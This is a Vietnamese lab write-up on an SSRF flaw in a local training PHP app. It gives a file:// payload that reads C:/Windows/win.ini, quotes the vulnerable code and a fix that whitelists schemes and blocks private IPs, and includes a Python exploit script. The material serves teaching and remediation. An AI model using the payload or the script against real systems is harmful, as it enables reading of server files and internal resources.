1. Server-Side Request Forgery (SSRF)

URL: `http://127.0.0.1/OhMyCrab/modules/ssrf/ssrf.php`

Ứng dụng tồn tại lỗ hổng SSRF do cho phép người dùng cung cấp URL tùy ý và server trực tiếp gửi request tới URL đó thông qua hàm `file_get_contents()` mà không thực hiện validate hoặc giới hạn destination. Điều này cho phép attacker lợi dụng server làm trung gian để truy cập các tài nguyên nội bộ (localhost/internal services) mà bình thường không thể truy cập từ bên ngoài.

PoC:

- Truy cập chức năng Fetch URL. Nhập payload: `file:///C:/Windows/win.ini`

- Submit request và quan sát kết quả trả về.

<img width="722" height="668" alt="image" src="https://github.com/user-attachments/assets/ae40cc38-cbe7-452e-9b5d-06cbfdce3030" />

- Kết quả hiển thị nội dung file:

```
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
```

- Điều này chứng minh attacker có thể đọc file nội bộ trên server, truy cập tài nguyên local, rò rỉ thông tin nhạy cảm của hệ thống, lợi dụng SSRF để truy cập các protocol khác ngoài HTTP/HTTPS

Phân tích source code

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $url = $_POST['url'];
        $response = @file_get_contents($url);
        if (!$response) {
            $response = "Không thể fetch URL";
        }
    }
```

- Ứng dụng nhận URL trực tiếp từ dữ liệu người dùng `$url = $_POST['url'];` sau đó giá trị URL được truyền trực tiếp vào hàm `file_get_contents()`. Hàm file_get_contents() hỗ trợ nhiều protocol wrapper như http://, https://, file://, ftp://, php://. Do ứng dụng không validate URL, whitelist protocol, filter localhost/internal resource, giới hạn destination nên attacker có thể kiểm soát hoàn toàn request được gửi từ phía server.

Cách khắc phục

```
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $url = $_POST['url'];
    $parsed = parse_url($url);
    if (
        !isset($parsed['scheme']) ||
        !in_array($parsed['scheme'], ['http', 'https'])
    ) {
        $response = "URL không hợp lệ";
    } else {
        $host = gethostbyname($parsed['host']);
        if (
            filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
        ) {
            $response = "Không được phép truy cập tài nguyên nội bộ";
        } else {
            $response = file_get_contents($url);
        }
    }
```

- Sau khi fix Ứng dụng chỉ cho phép sử dụng giao thức http, http. Chặn các dangerous protocol như: file://, php://, ftp://

- Kiểm tra và từ chối: localhost, loopback address, private IP range, reserved IP range

Script khai thác

```
import requests
import re

url = "http://127.0.0.1/OhMyCrab/modules/ssrf/ssrf.php"
data = {
    "url": "file:///C:/Windows/win.ini"
}
response = requests.post(url, data=data)
match = re.search(r"<pre>(.*?)</pre>", response.text, re.S)
if match:
    output = match.group(1).strip()
    print("Kết quả SSRF:")
    print(output)
else:
    print("Không tìm thấy output")
```

Script được sử dụng để tự động khai thác lỗ hổng SSRF bằng cách gửi payload file:// tới chức năng fetch URL của ứng dụng và trích xuất nội dung file nội bộ.
